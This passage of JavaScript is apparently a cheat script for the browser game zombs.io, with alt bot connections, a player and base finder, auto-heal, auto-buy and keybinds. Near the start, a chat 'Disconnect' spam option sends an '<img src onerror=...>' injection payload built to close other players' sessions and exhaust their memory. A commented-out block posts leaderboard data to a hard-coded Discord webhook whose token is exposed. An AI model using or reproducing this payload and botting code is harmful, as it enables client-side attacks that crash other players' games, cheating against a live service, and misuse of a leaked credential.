            spamMessage === "Regular" ? !ws.isclosed && ws.network.sendPacket(9, { name: "SendChatMessage", channel: "Local", message: `............................................................................................................................................................................................................................` })
                : spamMessage === "Disconnect" ? !ws.isclosed && ws.network.sendPacket(9, { name: "SendChatMessage", channel: "Local", message: `.............................................................................................................................<img src onerror="window.client&&client.closeSession(client.connectedToId);game.network.socket.send([]);[...Array(2**32-1)]" ` })
                    : null;
        };
        if (ws.data.name == "PartyShareKey") {
            ws.psk = ws.data;
            altElem.style.display = 'block';
        };

        if (window.mousemove) {
            mousemove = true;
        } else mousemove = false;

        if (window.lock) {
            lock = true;
        } else lock = false;

        if (window.autoraid) {
            ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bomb", tier: 1 });
            ws.network.sendPacket(9, { name: "EquipItem", itemName: "Bomb", tier: 1 });
            ws.network.sendPacket(9, { name: "BuyItem", itemName: "PetCARL", tier: 1 });
            ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetCARL", tier: 1 });
        };

        if (ws.data.opcode == 0) {
            if (heal) {
                if (ws.myPlayer) {
                    let playerHealth = (ws.myPlayer.health / ws.myPlayer.maxHealth) * 100;
                    if (playerHealth <= 20) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "HealthPotion", tier: 1 });
                    };
                };
                if (ws.myPet) {
                    let petHealth = (ws.myPet.health / ws.myPet.maxHealth) * 100;
                    if (petHealth <= 70) {
                        if (!ws.shouldHealPet) {
                            ws.shouldHealPet = true;
                            setTimeout(() => {
                                ws.shouldHealPet = false;
                            }, 300);
                            ws.network.sendPacket(9, { name: "BuyItem", itemName: "PetHealthPotion", tier: 1 });
                            ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetHealthPotion", tier: 1 });
                        };
                    };
                };
            };
            ws.network.sendPacket(9, { name: "BuyItem", itemName: "HealthPotion", tier: 1 });
        };

        switch (ws.data.opcode) {
            case 4:
                ws.EnterWorld2Response && ws.send(ws.EnterWorld2Response)
                try {
                    ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: game.ui.playerPartyShareKey });
                    ws.network.sendPacket(3, { up: 1 });
                } catch (err) {
                    ws.close();
                    game.ui.components.PopupOverlay.showHint("Server is full");
                    return;
                };
                game.ui.components.PopupOverlay.showHint("Alt successfully sent. ID: " + ws.cloneId);
                break;
        };
    };
};

window.sendAitoAlt = () => {
    if (window.startaito) {
        let server = game.network.connectionOptions ?? game.options.servers[document.getElementsByClassName('hud-intro-server')[0].value];

        let ws = new WebSocket('wss://' + server.hostname + ':' + server.port);

        ws.binaryType = "arraybuffer";

        ws.onclose = () => {
            ws.isclosed = true;
        }

        ws.onmessage = msg => {
            if (new Uint8Array(msg.data)[0] == 5) {
                ws.network = new game.networkType();
                ws.network.sendPacket = (e, t) => {
                    if (!ws.isclosed) {
                        ws.send(new Uint8Array(ws.network.codec.encode(e, t)));
                    };
                };
                ws.network.sendInput = (t) => {
                    ws.network.sendPacket(3, t);
                };
                ws.network.sendRpc = (t) => {
                    ws.network.sendPacket(9, t);
                };
                wasmmodule(wasm => {
                    ws.network.sendPacket(4, {
                        'displayName': game.options.nickname,
                        'extra': wasm[5].extra
                    });
                    ws.EnterWorld2Response = wasm[6];
                }, new Uint8Array(msg.data), server.ipAddress);
                return;
            };

            ws.data = ws.network.codec.decode(msg.data);

            if (ws.data.uid) {
                ws.uid = ws.data.uid;
            };

            if (ws.data.name) {
                ws.dataType = ws.data;
            };

            if (!window.startaito && !ws.isclosed) {
                ws.isclosed = true;
                ws.close();
            };

            if (ws.verified) {
                if (!ws.isDay && !ws.isclosed) {
                    ws.isclosed = true;
                    ws.close();

                    window.sendAitoAlt();
                };
            };

            if (ws.data.name == "DayCycle") {
                ws.isDay = ws.data.response.isDay;

                if (ws.isDay) {
                    ws.verified = true;
                };
            };

            if (ws.data.name === "Dead") {
                ws.network.sendInput({
                    respawn: 1
                });
            };

            if (ws.data.name == "Leaderboard") {
                ws.lb = ws.data;

                if (ws.psk) {
                    ws.network.sendRpc({
                        name: "JoinPartyByShareKey",
                        partyShareKey: game.ui.getPlayerPartyShareKey()
                    });

                    if (ws.psk.response.partyShareKey == game.ui.getPlayerPartyShareKey()) {
                        ws.network.sendRpc({
                            name: "BuyItem",
                            itemName: "Pause",
                            tier: 1
                        });
                    };
                };
            };

            if (ws.data.name == "PartyShareKey") {
                ws.psk = ws.data;
            };

            switch (ws.data.opcode) {
                case 4:
                    ws.EnterWorld2Response && ws.send(ws.EnterWorld2Response);
                    ws.network.sendRpc({
                        name: "JoinPartyByShareKey",
                        partyShareKey: game.ui.getPlayerPartyShareKey() + ""
                    })
                    break;
            };
        };
    };
};

// Player Finder

window.playerFinder = () => {
    if (window.startPlayerFinder) {
        let server = game.network.connectionOptions ?? game.options.servers[document.getElementsByClassName("hud-intro-server")[0].value];

        let name = false;

        let player = game.ui.components.Leaderboard.leaderboardData[document.getElementsByClassName("16i2")[0].value - 1].name;

        let ws = new WebSocket('wss://' + server.hostname + ':' + server.port);

        ws.binaryType = "arraybuffer";

        ws.onclose = () => {
            ws.isclosed = true;
        };

        ws.onmessage = msg => {
            if (new Uint8Array(msg.data)[0] == 5) {
                ws.network = new game.networkType();
                ws.network.sendPacket = (e, t) => {
                    if (!ws.isclosed) {
                        ws.send(new Uint8Array(ws.network.codec.encode(e, t)));
                    };
                };
                ws.network.sendInput = (t) => {
                    ws.network.sendPacket(3, t);
                };
                ws.network.sendRpc = (t) => {
                    ws.network.sendPacket(9, t);
                };
                wasmmodule(wasm => {
                    ws.network.sendPacket(4, {
                        'displayName': game.options.nickname,
                        'extra': wasm[5].extra
                    });
                    ws.EnterWorld2Response = wasm[6];
                }, new Uint8Array(msg.data), server.ipAddress);
                return;
            };

            ws.data = ws.network.codec.decode(msg.data);

            if (ws.data.uid) {
                ws.uid = ws.data.uid;
            };

            ws.network.sendInput({
                'up': 1
            });

            if (ws.data.entities) {
                for (let i in ws.data.entities) {
                    if (ws.data.entities[i].name == player) {
                        window.startPlayerFinder = false;
                        window.playerX = Math.round(ws.data.entities[i].position.x);
                        window.playerY = Math.round(ws.data.entities[i].position.y);
                        document.getElementsByClassName("16i2")[0].value = "(" + window.playerX + ", " + window.playerY + ")";
                        document.getElementsByClassName("18i2")[0].innerText = "Activate Player Finder";
                        game.ui.components.PopupOverlay.showHint(`Successfully found the player, { x: ${window.playerX}, y: ${window.playerY} };`);

                        let xPos = Math.round(window.playerX / game.world.getHeight() * 100);
                        let yPos = Math.round(window.playerY / game.world.getWidth() * 100);

                        let player = document.createElement('div');
                        player.classList.add('hud-map-player');
                        player.classList.add('scanned-player');
                        player.style.left = xPos + '%';
                        player.style.top = yPos + '%';

                        document.getElementsByClassName('hud-map')[0].appendChild(player);
                        ws.close();
                    };

                    if (ws.data.entities[i].name) {
                        name = true;
                    };
                };
            };

            if (ws.data.name == "DayCycle") {
                ws.isDay = ws.data.response.isDay;
            };

            if (ws.data.name == 'Dead') {
                ws.network.sendInput({
                    'respawn': 1
                });
            };

            if (name && !ws.isclosed) {
                ws.isclosed = true;
                setTimeout(() => {
                    ws.close();
                    window.playerFinder();
                }, 10000);
            };

            if (ws.data.name == "PartyShareKey") {
                ws.psk = ws.data;
            };

            switch (ws.data.opcode) {
                case 4:
                    ws.EnterWorld2Response && ws.send(ws.EnterWorld2Response);
                    ws.network.sendRpc({
                        'name': "JoinPartyByShareKey",
                        'partyShareKey': game.ui.getPlayerPartyShareKey() + ""
                    });
                    break;
            };
        };
    };
};

// Base Finder

window.baseFinder = () => {
    if (window.basefind) {
        let server = game.network.connectionOptions ?? game.options.servers[document.getElementsByClassName("hud-intro-server")[0].value];

        let ws = new WebSocket('wss://' + server.hostname + ':' + server.port);

        ws.binaryType = "arraybuffer";

        ws.onclose = () => {
            ws.isclosed = true;
        };

        ws.onmessage = msg => {
            if (new Uint8Array(msg.data)[0] == 5) {
                ws.network = new game.networkType();
                ws.network.sendPacket = (e, t) => {
                    if (!ws.isclosed) {
                        ws.send(new Uint8Array(ws.network.codec.encode(e, t)));
                    };
                };
                ws.network.sendInput = (t) => {
                    ws.network.sendPacket(3, t);
                };
                ws.network.sendRpc = (t) => {
                    ws.network.sendPacket(9, t);
                };
                wasmmodule(wasm => {
                    ws.network.sendPacket(4, {
                        'displayName': "user" + Math.round(Math.random() * 100000),
                        'extra': wasm[5].extra
                    });
                    ws.EnterWorld2Response = wasm[6];
                }, new Uint8Array(msg.data), server.ipAddress);
                return;
            };

            ws.data = ws.network.codec.decode(msg.data);

            if (ws.data.uid) {
                ws.uid = ws.data.uid;
            };

            if (ws.data.name == "DayCycle") {
                ws.isDay = ws.data.response.isDay;
            };

            if (ws.data.name === "Dead") {
                ws.network.sendInput({
                    respawn: 1
                });
            };

            let finder = setInterval(() => {
                setTimeout(() => {
                    ws.close();

                    window.baseFinder();
                }, 30000);

                ws.close();
            }, 30000);

            if (ws.data.name == "PartyShareKey") {
                ws.psk = ws.data;
            };

            ws.onTowerFound = data => {
                let res = JSON.stringify(data);
                let res2 = JSON.parse(res);

                let Schema = Object.keys(game.ui.buildingSchema).filter(building => building !== 'Harvester');

                for (let i in Schema) {
                    for (let entity in ws.data.entities) {
                        if (res.includes(Schema[i])) {
                            for (let e in res2.entities) {
                                let xPos = Math.round(res2.entities[e].position.x / game.world.getHeight() * 100);
                                let yPos = Math.round(res2.entities[e].position.y / game.world.getWidth() * 100);

                                let building = document.createElement('div');
                                building.classList.add('hud-map-building');
                                building.classList.add('scanned-building');
                                building.style.left = xPos + '%';
                                building.style.top = yPos + '%';

                                document.getElementsByClassName('hud-map')[0].appendChild(building);

                                ws.close();
                            };
                        };
                    };
                };
            };

            switch (ws.data.opcode) {
                case 0:
                    ws.onTowerFound(ws.data);
                    break;
                case 4:
                    ws.EnterWorld2Response && ws.send(ws.EnterWorld2Response);
                    ws.network.sendRpc({
                        name: "JoinPartyByShareKey",
                        partyShareKey: game.ui.playerPartyShareKey
                    });
                    ws.network.sendInput({
                        up: 1
                    });
                    break;
            };
        };
    };
};
let checkedServers = [];
/*
window.appSsrs = res => {
    game.network.connected = false;

    let discordWebhook = "https://discord.com/api/webhooks/1047904101771518013/lq0lFbBAif6P66yTxxbHesjtZc7EAJ1LWuH1xDe6U7w8y7JfMKeW6mI8HwKxA2_-XVa1";
    let i = document.createElement('iframe');
    document.body.appendChild(i);
    let request = new XMLHttpRequest();
    request.open("POST", discordWebhook);
    request.setRequestHeader('Content-type', 'application/json');
    let params = {
        content: `
\`\`\`json
"${res.server.id}": {${res.leaderboard.map(lb => {return `
    Rank: #${lb.rank + 1}, Nickname: ${lb.name}, Wave: ${lb.wave}, Score: ${lb.score}`;
                                                 })}
}
\`\`\`
`}
    request.send(JSON.stringify(params));
};
*/
localStorage.safe = true;
var getIsZombiesActive = function () {
    let isZombiesActive = false;
    for (let i in game.world.entities) {
        if (game.world.entities[i].fromTick.model !== "NeutralTier1") {
            if (game.world.entities[i].fromTick.entityClass == "Npc") {
                isZombiesActive = true;
            }
        }
    }
    return isZombiesActive;
};

var getactiveCommingbosswaves = function () {
    let activeCommingbosswave = false;
    let aftercommingbosswaves = [48, 56, 64, 72, 80, 88, 96, 104, 120];
    for (let i = 0; i < aftercommingbosswaves.length; i++) {
        if (myPlayer.wave == aftercommingbosswaves[i]) {
            activeCommingbosswave = true;
        }
    }
    return activeCommingbosswave;
};

var getbosswaves = function () {
    let activebosswave = false;
    let allbosswaves = [9, 17, 25, 33, 41, 49, 57, 65, 73, 81, 89, 97, 105, 121];
    for (let i = 0; i < allbosswaves.length; i++) {
        if (myPlayer.wave == allbosswaves[i]) {
            activebosswave = true;
        }
    }
    return activebosswave;
};
document.getElementsByClassName("hud-iframe-grid")[0].innerHTML = `
<div style="text-align:center">
<h2>Keybinds</h2>
<h3>Note: To use keys like "x" and "i", you need to type "KeyX" or "KeyI."</h3>
<br>
<input type="string" class="btn btn-white key0" placeholder="${localStorage.key0}" style="width:42%;">

<button class="btn btn-white setKey0" style="width:42%;">Mousemove</button>

<input type="string" class="btn btn-white keya1" placeholder="${localStorage.key1}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKeya1" style="width:42%; margin-top: 6px;">Alt heal spell</button>

<input type="string" class="btn btn-white key2" placeholder="${localStorage.key2}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey2" style="width:42%; margin-top: 6px;">1b1 (Mouse)</button>

<input type="string" class="btn btn-white key3" placeholder="${localStorage.key3}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey3" style="width:42%; margin-top: 6px;">Join next alt</button>

<input type="string" class="btn btn-white key4" placeholder="${localStorage.key4}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey4" style="width:42%; margin-top: 6px;">Alt Spears</button>

<input type="string" class="btn btn-white key5" placeholder="${localStorage.key5}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey5" style="width:42%; margin-top: 6px;">Alt Shields</button>

<input type="string" class="btn btn-white key6" placeholder="${localStorage.key6}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey6" style="width:42%; margin-top: 6px;">Alt Carl</button>

<input type="string" class="btn btn-white key7" placeholder="${localStorage.key7}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey7" style="width:42%; margin-top: 6px;">Alt Woody</button>

<input type="string" class="btn btn-white key8" placeholder="${localStorage.key8}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey8" style="width:42%; margin-top: 6px;">Alts sell pets</button>

<input type="string" class="btn btn-white key9" placeholder="${localStorage.key9}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKey9" style="width:42%; margin-top: 6px;">Build Base (1)</button>

<input type="string" class="btn btn-white keyb10" placeholder="${localStorage.key10}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKeyb10" style="width:42%; margin-top: 6px;">Build Base (3)</button>

<input type="string" class="btn btn-white keyb11" placeholder="${localStorage.key11}" style="width:42%; margin-top: 6px;">

<button class="btn btn-white setKeyb11" style="width:42%; margin-top: 6px;">Lock Alts</button>
<hr>
<h2 style="text-align: center; margin: 0px;">Commands</h2>
<hr>
<h3 style="text-align: center; margin: 0px;">&#x2022; !move</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !unmove</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !spam</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !!spam</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !aim</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !unaim</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !c</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !!c</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !r</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !spear</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !ahrc</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !!ahrc</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !4pt</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !!4pt</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !respawn</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !!respawn</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !ab</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !!ab</h3>
<h3 style="text-align: center; margin: 0px;">&#x2022; !up</h3>
`;

document.getElementsByClassName("setKey0")[0].addEventListener('click', function () {
    localStorage.key0 = document.getElementsByClassName("key0")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key0}`);
});

document.getElementsByClassName("setKeya1")[0].addEventListener('click', function () {
    localStorage.key1 = document.getElementsByClassName("keya1")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key1}`);
});

document.getElementsByClassName("setKey2")[0].addEventListener('click', function () {
    localStorage.key2 = document.getElementsByClassName("key2")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key2}`);
});

document.getElementsByClassName("setKey3")[0].addEventListener('click', function () {
    localStorage.key3 = document.getElementsByClassName("key3")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key3}`);
});

document.getElementsByClassName("setKey4")[0].addEventListener('click', function () {
    localStorage.key4 = document.getElementsByClassName("key4")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key4}`);
});

document.getElementsByClassName("setKey5")[0].addEventListener('click', function () {
    localStorage.key5 = document.getElementsByClassName("key5")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key5}`);
});

document.getElementsByClassName("setKey6")[0].addEventListener('click', function () {
    localStorage.key6 = document.getElementsByClassName("key6")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key6}`);
});

document.getElementsByClassName("setKey7")[0].addEventListener('click', function () {
    localStorage.key7 = document.getElementsByClassName("key7")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key7}`);
});

document.getElementsByClassName("setKey8")[0].addEventListener('click', function () {
    localStorage.key8 = document.getElementsByClassName("key8")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key8}`);
});

document.getElementsByClassName("setKey9")[0].addEventListener('click', function () {
    localStorage.key9 = document.getElementsByClassName("key9")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key9}`);
});

document.getElementsByClassName("setKeyb10")[0].addEventListener('click', function () {
    localStorage.key10 = document.getElementsByClassName("keyb10")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key10}`);
});

document.getElementsByClassName("setKeyb11")[0].addEventListener('click', function () {
    localStorage.key11 = document.getElementsByClassName("keyb11")[0].value;
    game.ui.components.PopupOverlay.showHint(`Key set to ${localStorage.key11}`);
});
document.getElementsByClassName("36i6")[0].addEventListener('click', function () {
    window.showerss = !window.showerss;
    document.getElementsByClassName("36i6")[0].innerText = "Enable Exact Rss Counter";
    if (window.showerss) {
        document.getElementsByClassName("36i6")[0].innerText = "Disable Exact Rss Counter";
    }
});
document.addEventListener("keydown", e => {
    if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
        switch (e.code) {
            case localStorage.key0:
                document.getElementsByClassName("emm")[0].click();
                break;
            case localStorage.key1:
                document.getElementsByClassName("0i1")[0].click();
                break;
            case localStorage.key2:
                document.getElementsByClassName("2i1")[0].click();
                break;
            case localStorage.key3:
                document.getElementsByClassName("4i1")[0].click();
                break;
            case localStorage.key4:
                document.getElementsByClassName("11i1")[0].click();
                break;
            case localStorage.key5:
                document.getElementsByClassName("14i1")[0].click();
                break;
            case localStorage.key6:
                document.getElementsByClassName("15i1")[0].click();
                break;
            case localStorage.key7:
                document.getElementsByClassName("16i1")[0].click();
                break;
            case localStorage.key8:
                document.getElementsByClassName("17i1")[0].click();
                break;
            case localStorage.key9:
                document.getElementsByClassName("1i3")[0].click();
                break;
            case localStorage.key10:
                document.getElementsByClassName("11i3")[0].click();
                break;
            case localStorage.key11:
                document.getElementsByClassName("30i2")[0].click();
                break;
        };
        if (e.key === localStorage.key0) {
            document.getElementsByClassName("emm")[0].click();
        };
        if (e.key === localStorage.key1) {
            document.getElementsByClassName("0i1")[0].click();
        };
        if (e.key === localStorage.key2) {
            document.getElementsByClassName("2i1")[0].click();
        };
        if (e.key === localStorage.key3) {
            document.getElementsByClassName("4i1")[0].click();
        };
        if (e.key === localStorage.key4) {
            document.getElementsByClassName("11i1")[0].click();
        };
        if (e.key === localStorage.key5) {
            document.getElementsByClassName("14i1")[0].click();
        };
        if (e.key === localStorage.key6) {
            document.getElementsByClassName("15i1")[0].click();
        };
        if (e.key === localStorage.key7) {
            document.getElementsByClassName("16i1")[0].click();
        };
        if (e.key === localStorage.key8) {
            document.getElementsByClassName("17i1")[0].click();
        };
        if (e.key === localStorage.key9) {
            document.getElementsByClassName("1i3")[0].click();
        };
        if (e.key === localStorage.key10) {
            document.getElementsByClassName("11i3")[0].click();
        };
        if (e.key === localStorage.key11) {
            document.getElementsByClassName("30i2")[0].click();
        };
    };
});
function equipItem(item, tier) {
    game.network.sendRpc({
        name: "EquipItem",
        itemName: item,
        tier: tier
    })
};

function buyItem(item, tier) {
    game.network.sendRpc({
        name: "BuyItem",
        itemName: item,
        tier: tier
    })
}

function shopShortcut(item, tier) {
    buyItem(item, tier)
    if (game.ui.playerWeaponName !== item) {
        equipItem(item, tier)
    }
}

function buyPickaxe() {
    let gold = game.ui.playerTick.gold
    let pickaxe = game.ui.inventory.Pickaxe
    if (pickaxe.tier == 1 && gold >= 1000) {
        shopShortcut("Pickaxe", 2)
        return
    }
    if (pickaxe.tier == 2 && gold >= 3000) {
        shopShortcut("Pickaxe", 3);
        return
    }
    if (pickaxe.tier == 3 && gold >= 5000) {
        shopShortcut("Pickaxe", 4);
        return
    }
    if (pickaxe.tier == 4 && gold >= 8000) {
        shopShortcut("Pickaxe", 5);
        return
    }
    if (pickaxe.tier == 5 && gold >= 24000) {
        shopShortcut("Pickaxe", 6);
        return
    }
    if (pickaxe.tier == 6 && gold >= 90000) {
        shopShortcut("Pickaxe", 7);
        return
    } else if (game.ui.playerWeaponName !== "Pickaxe") {
        equipItem("Pickaxe", game.ui.inventory.Pickaxe.tier)
    }
}

function buySpear2() {
    let gold = game.ui.playerTick.gold
    let spear = game.ui.inventory.Spear
    if (!spear && gold >= 1400) {
        shopShortcut("Spear", 1)
        return
    }
    if (spear.tier == 1 && gold >= 2800) {
        shopShortcut("Spear", 2)
        return
    }
    if (spear.tier == 2 && gold >= 5600) {
        shopShortcut("Spear", 3)
        return
    }
    if (spear.tier == 3 && gold >= 11200) {
        shopShortcut("Spear", 4)
        return
    }
    if (spear.tier == 4 && gold >= 22500) {
        shopShortcut("Spear", 5)
        return
    }
    if (spear.tier == 5 && gold >= 45000) {
        shopShortcut("Spear", 6)
        return
    }
    if (spear.tier == 6 && gold >= 90000) {
        shopShortcut("Spear", 7)
        return
    } else if (game.ui.playerWeaponName !== "Spear") {
        equipItem("Spear", game.ui.inventory.Spear.tier)
    }
}

function buyBow() {
    let gold = game.ui.playerTick.gold
    let bow = game.ui.inventory.Bow
    if (!bow && gold >= 100) {
        shopShortcut("Bow", 1)
        return
    }
    if (bow.tier == 1 && gold >= 400) {
        shopShortcut("Bow", 2)
        return
    }
    if (bow.tier == 2 && gold >= 2000) {
        shopShortcut("Bow", 3)
        return
    }
    if (bow.tier == 3 && gold >= 7000) {
        shopShortcut("Bow", 4)
        return
    }
    if (bow.tier == 4 && gold >= 24000) {
        shopShortcut("Bow", 5)
        return
    }
    if (bow.tier == 5 && gold >= 30000) {
        shopShortcut("Bow", 6)
        return
    }
    if (bow.tier == 6 && gold >= 90000) {
        shopShortcut("Bow", 7)
        return
    } else if (game.ui.playerWeaponName !== "Bow") {
        equipItem("Bow", game.ui.inventory.Bow.tier)
    }
}

function buyBomb() {
    let gold = game.ui.playerTick.gold
    let bomb = game.ui.inventory.Bomb
    if (!bomb && gold >= 100) {
        shopShortcut("Bomb", 1)
        return
    }
    if (bomb.tier == 1 && gold >= 400) {
        shopShortcut("Bomb", 2)
        return
    }
    if (bomb.tier == 2 && gold >= 3000) {
        shopShortcut("Bomb", 3)
        return
    }
    if (bomb.tier == 3 && gold >= 5000) {
        shopShortcut("Bomb", 4)
        return
    }
    if (bomb.tier == 4 && gold >= 24000) {
        shopShortcut("Bomb", 5)
        return
    }
    if (bomb.tier == 5 && gold >= 50000) {
        shopShortcut("Bomb", 6)
        return
    }
    if (bomb.tier == 6 && gold >= 90000) {
        shopShortcut("Bomb", 7)
        return
    } else if (game.ui.playerWeaponName !== "Bomb") {
        equipItem("Bomb", game.ui.inventory.Bomb.tier)
    }
}

function buyShield() {
    let gold = game.ui.playerTick.gold
    let shield = game.ui.inventory.ZombieShield
    if (!shield && gold >= 1000) {
        buyItem("ZombieShield", 1)
        return
    }
    if (shield.tier == 1 && gold >= 3000) {
        buyItem("ZombieShield", 2)
        return
    }
    if (shield.tier == 2 && gold >= 7000) {
        buyItem("ZombieShield", 3)
        return
    }
    if (shield.tier == 3 && gold >= 14000) {
        buyItem("ZombieShield", 4)
        return
    }
    if (shield.tier == 4 && gold >= 18000) {
        buyItem("ZombieShield", 5)
        return
    }
    if (shield.tier == 5 && gold >= 22000) {
        buyItem("ZombieShield", 6)
        return
    }
    if (shield.tier == 6 && gold >= 24000) {
        buyItem("ZombieShield", 7)
        return
    }
    if (shield.tier == 7 && gold >= 30000) {
        buyItem("ZombieShield", 8)
        return
    }
    if (shield.tier == 8 && gold >= 45000) {
        buyItem("ZombieShield", 9)
        return
    }
    if (shield.tier == 9 && gold >= 70000) {
        buyItem("ZombieShield", 10)
        return
    }
}

function buyZombieShield() {
    let gold = game.ui.playerTick.gold
    let shield = game.ui.inventory.ZombieShield
    if (!shield && gold >= 1000) {
        buyItem("ZombieShield", 1)
        return
    }
    if (shield.tier == 1 && gold >= 3000) {
        buyItem("ZombieShield", 2)
        return
    }
    if (shield.tier == 2 && gold >= 7000) {
        buyItem("ZombieShield", 3)
        return
    }
    if (shield.tier == 3 && gold >= 14000) {
        buyItem("ZombieShield", 4)
        return
    }
    if (shield.tier == 4 && gold >= 18000) {
        buyItem("ZombieShield", 5)
        return
    }
    if (shield.tier == 5 && gold >= 22000) {
        buyItem("ZombieShield", 6)
        return
    }
    if (shield.tier == 6 && gold >= 24000) {
        buyItem("ZombieShield", 7)
        return
    }
    if (shield.tier == 7 && gold >= 30000) {
        buyItem("ZombieShield", 8)
        return
    }
    if (shield.tier == 8 && gold >= 45000) {
        buyItem("ZombieShield", 9)
        return
    }
    if (shield.tier == 9 && gold >= 70000) {
        buyItem("ZombieShield", 10)
        return
    }
}

function buyPet(item, tier) {
    if (game.ui.getPlayerPetName() == item) {
        shopShortcut("PetRevive", 1)
    } else {
        let i = 0
        let j = setInterval(function () {
            console.log(i)
            shopShortcut(item, tier)
            i++
            if (i >= 25 || game.ui.getPlayerPetName() == item) {
                i = 0
                clearInterval(j)
            }
        }, 250);
    }
}

function getPetTier(num) {
    if (document.querySelectorAll(".hud-shop-item-tier")[5].childNodes[0].textContent.match(/\d+/) != null) {
        let petLevel = document.querySelectorAll(".hud-shop-item-tier")[num].childNodes[0].textContent.match(/\d+/)[0]
        if (petLevel <= 8) return 1
        if (petLevel <= 16) return 2
        if (petLevel <= 24) return 3
        if (petLevel <= 32) return 4
        if (petLevel <= 48) return 5
        if (petLevel <= 64) return 6
        if (petLevel <= 96) return 7
        if (petLevel > 96) return 8
    } else return 8
}
document.hasFocus3 = true;
let lastTick = Date.now();
let _inactiveTick = () => {
    if (!document.hasFocus() && !document.hasFocus3) !document.stoppedRing && game.renderer.ticker._tick2();
    if ((Date.now() - lastTick) > 500) {
        document.hasFocus3 = false;
    }
    if (document.hasFocus()) {
        if (document.hasFocus3 == false) {
            document.hasFocus3 = true;
        }
    }
}
let _Tick = () => {
    if (document.hasFocus() || document.hasFocus3) !document.stoppedRing && game.renderer.ticker._tick2();
    requestAnimationFrame(_Tick);
    lastTick = Date.now();
}
!game.renderer.ticker._tick2 && (game.renderer.ticker._tick2 = game.renderer.ticker._tick, _Tick(), game.network.addPacketHandler(0, () => _inactiveTick()));
game.renderer.ticker._tick = () => { };

document.getElementsByClassName("hud-top-center")[0].innerHTML = `
<a id="shopshortcut1"><img src="http://zombs.io/asset/image/ui/inventory/inventory-pickaxe-t7.svg"></a>
<a id="shopshortcut2"><img src="http://zombs.io/asset/image/ui/inventory/inventory-spear-t7.svg"></a>
<a id="shopshortcut3"><img src="http://zombs.io/asset/image/ui/inventory/inventory-bow-t7.svg"></a>
<a id="shopshortcut4"><img src="http://zombs.io/asset/image/ui/inventory/inventory-bomb-t7.svg"></a>
<a id="shopshortcut5"><img src="http://zombs.io/asset/image/ui/inventory/inventory-health-potion.svg"></a>
<a id="shopshortcut6"><img src="http://zombs.io/asset/image/ui/inventory/inventory-pet-health-potion.svg"></a>
<a id="shopshortcut7"><img src="http://zombs.io/asset/image/ui/inventory/inventory-shield-t10.svg"></a>
<a id="shopshortcut8"><img src="http://zombs.io/asset/image/ui/inventory/inventory-pet-ghost-t1.svg"></a>
<a id="shopshortcut9"><img src="http://zombs.io/asset/image/ui/inventory/inventory-pet-miner-t8.svg"></a>
<a id="shopshortcut10"><img src="http://zombs.io/asset/image/ui/inventory/inventory-pet-carl-t8.svg"></a>
`;


document.getElementById('shopshortcut1').addEventListener('click', buyPickaxe);
document.getElementById('shopshortcut2').addEventListener('click', buySpear2);
document.getElementById('shopshortcut3').addEventListener('click', buyBow);
document.getElementById('shopshortcut4').addEventListener('click', buyBomb);
document.getElementById('shopshortcut5').addEventListener('click', () => { shopShortcut("HealthPotion", 1) });
document.getElementById('shopshortcut6').addEventListener('click', () => { shopShortcut("PetHealthPotion", 1) });
document.getElementById('shopshortcut7').addEventListener('click', buyZombieShield);
document.getElementById('shopshortcut8').addEventListener('click', () => { Game.currentGame.network.sendRpc({ name: "DeleteBuilding", uid: game.ui.getPlayerPetUid() }) });
document.getElementById('shopshortcut9').addEventListener('click', () => { buyPet("PetMiner", getPetTier(6)) });
document.getElementById('shopshortcut10').addEventListener('click', () => { buyPet("PetCARL", getPetTier(5)) });


//exact resource count
window.showerss = false
const fullRSS = () => {
    if (window.showerss) {
        let resources = ["wood", "stone", "gold"];
        let pt = game.ui.playerTick;
        let rc = game.ui.components.Resources;
        for (let i = 0; i < resources.length; i++) {
            let rs = resources[i];
            rc[`${rs}Elem`].innerHTML = Math.round(pt[rs]).toLocaleString("en");
        };
